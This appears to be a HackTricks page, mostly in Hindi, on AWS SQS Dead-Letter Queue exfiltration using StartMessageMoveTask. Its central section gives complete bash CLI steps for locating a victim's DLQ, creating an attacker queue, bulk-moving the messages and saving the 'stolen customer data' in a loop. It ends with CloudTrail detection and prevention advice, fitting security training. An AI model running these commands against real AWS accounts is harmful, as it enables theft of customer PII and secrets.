# AWS – SQS DLQ Redrive Exfiltration via StartMessageMoveTask

{{#include ../../../banners/hacktricks-training.md}}

## विवरण

SQS message move tasks का दुरुपयोग करके victim के Dead-Letter Queue (DLQ) में जमा सभी संदेशों को चुराएँ और उन्हें attacker-controlled queue पर redirect करें, इसके लिए `sqs:StartMessageMoveTask` का उपयोग करें। यह तकनीक AWS के वैध message recovery फीचर का फायदा उठाकर DLQs में समय के साथ जमा संवेदनशील डेटा को exfiltrate करने के लिए प्रयोग की जाती है।

## Dead-Letter Queue (DLQ) क्या है?

Dead-Letter Queue एक विशेष SQS queue है जहाँ वे संदेश भेजे जाते हैं जो मुख्य एप्लिकेशन द्वारा सफलतापूर्वक प्रोसेस नहीं हो पाते। ये failed संदेश अक्सर निम्न चीज़ें रख सकते हैं:
- प्रोसेस न हो पाने वाला संवेदनशील application डेटा
- त्रुटि विवरण और debugging जानकारी
- Personal Identifiable Information (PII)
- API tokens, credentials, या अन्य secrets
- Business-critical transaction डेटा

DLQs असफल संदेशों के लिए एक "graveyard" की तरह काम करते हैं, इसलिए ये मूल्यवान लक्ष्य होते हैं क्योंकि इनमें समय के साथ उन संवेदनशील डेटा का संचय होता है जिन्हें ऐप्लिकेशन्स सही से हैंडल नहीं कर पाए।

## हमला परिदृश्य

वास्तविक उदाहरण:
1. **E-commerce application** SQS के माध्यम से ग्राहक आदेश प्रोसेस करता है
2. **कुछ ऑर्डर विफल हो जाते हैं** (payment issues, inventory problems, आदि) और DLQ में चले जाते हैं
3. **DLQ में हफ्तों/महीनों के विफल ऑर्डर जमा हो जाते हैं** जिनमें ग्राहक डेटा होता है: `{"customerId": "12345", "creditCard": "4111-1111-1111-1111", "orderTotal": "$500"}`
4. **Attacker को AWS credentials मिल जाते हैं** जिनमें SQS permissions हैं
5. **Attacker पाता है** कि DLQ में संवेदनशील डेटा वाले हजारों failed orders हैं
6. **व्यक्ति व्यक्तिगत संदेशों तक पहुँचने की कोशिश करने के बजाय** (धीमा और स्पष्ट), attacker `StartMessageMoveTask` का उपयोग करके सभी संदेशों को bulk में अपनी queue पर स्थानांतरित कर देता है
7. **Attacker एक ही ऑपरेशन में** सभी ऐतिहासिक संवेदनशील डेटा निकाल लेता है

## आवश्यकताएँ
- स्रोत queue को किसी queue के RedrivePolicy द्वारा DLQ के रूप में कॉन्फ़िगर किया गया होना चाहिए।
- IAM permissions (compromised victim principal के रूप में चलाते समय):
- DLQ (source) पर: `sqs:StartMessageMoveTask`, `sqs:GetQueueAttributes`.
- destination queue पर: संदेश deliver करने की अनुमति (उदा., queue policy जो victim principal से `sqs:SendMessage` को allow करती हो)। उसी account के destination के लिए यह सामान्यतः default में allowed होता है।
- यदि SSE-KMS सक्षम है: source CMK पर `kms:Decrypt`, और destination CMK पर `kms:GenerateDataKey`, `kms:Encrypt`।

## प्रभाव
DLQs में जमा संवेदनशील payloads (failed events, PII, tokens, application payloads) को native SQS APIs का उपयोग करके उच्च गति पर exfiltrate किया जा सकता है। यदि destination queue policy victim principal से `SendMessage` की अनुमति देती है तो यह cross-account भी काम करता है।

## दुरुपयोग करने का तरीका

- पीड़ित DLQ ARN की पहचान करें और सुनिश्चित करें कि यह वास्तव में किसी queue द्वारा DLQ के रूप में refer किया गया हो (कोई भी queue चलेगा)।
- एक attacker-controlled destination queue बनाएं या चुनें और उसका ARN प्राप्त करें।
- victim DLQ से आपकी destination queue तक एक message move task शुरू करें।
- प्रगति की निगरानी करें या आवश्यकता होने पर रद्द करें।

### CLI उदाहरण: E-commerce DLQ से ग्राहक डेटा निकालना

**परिदृश्य**: एक attacker ने AWS credentials compromise कर लिए हैं और पता चला है कि एक ई-कॉमर्स एप्लिकेशन SQS और एक DLQ का उपयोग करता है जिसमें ग्राहक के order processing के विफल प्रयास जमा हैं।

1) **Victim DLQ की खोज और निरीक्षण करें**
```bash
# List queues to find DLQs (look for names containing 'dlq', 'dead', 'failed', etc.)
aws sqs list-queues --queue-name-prefix dlq

# Let's say we found: https://sqs.us-east-1.amazonaws.com/123456789012/ecommerce-orders-dlq
VICTIM_DLQ_URL="https://sqs.us-east-1.amazonaws.com/123456789012/ecommerce-orders-dlq"
SRC_ARN=$(aws sqs get-queue-attributes --queue-url "$VICTIM_DLQ_URL" --attribute-names QueueArn --query Attributes.QueueArn --output text)

# Check how many messages are in the DLQ (potential treasure trove!)
aws sqs get-queue-attributes --queue-url "$VICTIM_DLQ_URL" \
--attribute-names ApproximateNumberOfMessages
# Output might show: "ApproximateNumberOfMessages": "1847"
```
2) **attacker-controlled गंतव्य queue बनाएँ**
```bash
# Create our exfiltration queue
ATTACKER_Q_URL=$(aws sqs create-queue --queue-name hacker-exfil-$(date +%s) --query QueueUrl --output text)
ATTACKER_Q_ARN=$(aws sqs get-queue-attributes --queue-url "$ATTACKER_Q_URL" --attribute-names QueueArn --query Attributes.QueueArn --output text)

echo "Created exfiltration queue: $ATTACKER_Q_ARN"
```
3) **थोक संदेश चोरी को निष्पादित करें**
```bash
# Start moving ALL messages from victim DLQ to our queue
# This operation will transfer thousands of failed orders containing customer data
echo "Starting bulk exfiltration of $SRC_ARN to $ATTACKER_Q_ARN"
TASK_RESPONSE=$(aws sqs start-message-move-task \
--source-arn "$SRC_ARN" \
--destination-arn "$ATTACKER_Q_ARN" \
--max-number-of-messages-per-second 100)

echo "Move task started: $TASK_RESPONSE"

# Monitor the theft progress
aws sqs list-message-move-tasks --source-arn "$SRC_ARN" --max-results 10
```
4) **चोरी किए गए संवेदनशील डेटा को एकत्र करें**
```bash
# Receive the exfiltrated customer data
echo "Receiving stolen customer data..."
aws sqs receive-message --queue-url "$ATTACKER_Q_URL" \
--attribute-names All --message-attribute-names All \
--max-number-of-messages 10 --wait-time-seconds 5

# Example of what an attacker might see:
# {
#   "Body": "{\"customerId\":\"cust_12345\",\"email\":\"john@example.com\",\"creditCard\":\"4111-1111-1111-1111\",\"orderTotal\":\"$299.99\",\"failureReason\":\"Payment declined\"}",
#   "MessageId": "12345-abcd-6789-efgh"
# }

# Continue receiving all messages in batches
while true; do
MESSAGES=$(aws sqs receive-message --queue-url "$ATTACKER_Q_URL" \
--max-number-of-messages 10 --wait-time-seconds 2 --output json)

if [ "$(echo "$MESSAGES" | jq '.Messages | length')" -eq 0 ]; then
echo "No more messages - exfiltration complete!"
break
fi

echo "Received batch of stolen data..."
# Process/save the stolen customer data
echo "$MESSAGES" >> stolen_customer_data.json
done
```
### क्रॉस-एकाउंट नोट्स
- गंतव्य queue में ऐसी resource policy होनी चाहिए जो victim principal को `sqs:SendMessage` की अनुमति दे (और, यदि लागू हो, KMS grants/permissions)।

## यह हमला प्रभावी क्यों है

1. **वैध AWS फीचर**: बिल्ट-इन AWS कार्यक्षमता का उपयोग करता है, जिससे इसे दुर्भावनापूर्ण के रूप में पहचानना कठिन हो जाता है  
2. **Bulk Operation**: धीमी व्यक्तिगत पहुंच की बजाय हजारों संदेशों को तेज़ी से स्थानांतरित करता है  
3. **Historical Data**: DLQs हफ्तों/महीनों में संवेदनशील डेटा जमा करते हैं  
4. **Under the Radar**: कई संगठन DLQ एक्सेस की करीबी निगरानी नहीं करते  
5. **Cross-Account Capable**: यदि permissions अनुमति दें तो हमलावर अपने ही AWS अकाउंट में exfiltrate कर सकता है

## पहचान और रोकथाम

### पहचान
संदिग्ध `StartMessageMoveTask` API कॉल के लिए CloudTrail की निगरानी करें:
```json
{
"eventName": "StartMessageMoveTask",
"sourceIPAddress": "suspicious-ip",
"userIdentity": {
"type": "IAMUser",
"userName": "compromised-user"
},
"requestParameters": {
"sourceArn": "arn:aws:sqs:us-east-1:123456789012:sensitive-dlq",
"destinationArn": "arn:aws:sqs:us-east-1:attacker-account:exfil-queue"
}
}
```
### रोकथाम
1. **न्यूनतम अधिकार**: केवल आवश्यक भूमिकाओं के लिए `sqs:StartMessageMoveTask` अनुमतियाँ सीमित करें
2. **DLQs की निगरानी**: असामान्य DLQ गतिविधि के लिए CloudWatch अलार्म सेट करें
3. **क्रॉस-एकाउंट नीतियाँ**: खाता-पार पहुँच की अनुमति देने वाली SQS queue नीतियों की सावधानीपूर्वक समीक्षा करें
4. **DLQs को एन्क्रिप्ट करें**: SSE-KMS का उपयोग करें और सीमित कुंजी नीतियाँ लागू करें
5. **नियमित सफाई**: DLQs में संवेदनशील डेटा को अनिश्चितकाल तक जमा न होने दें

{{#include ../../../banners/hacktricks-training.md}}
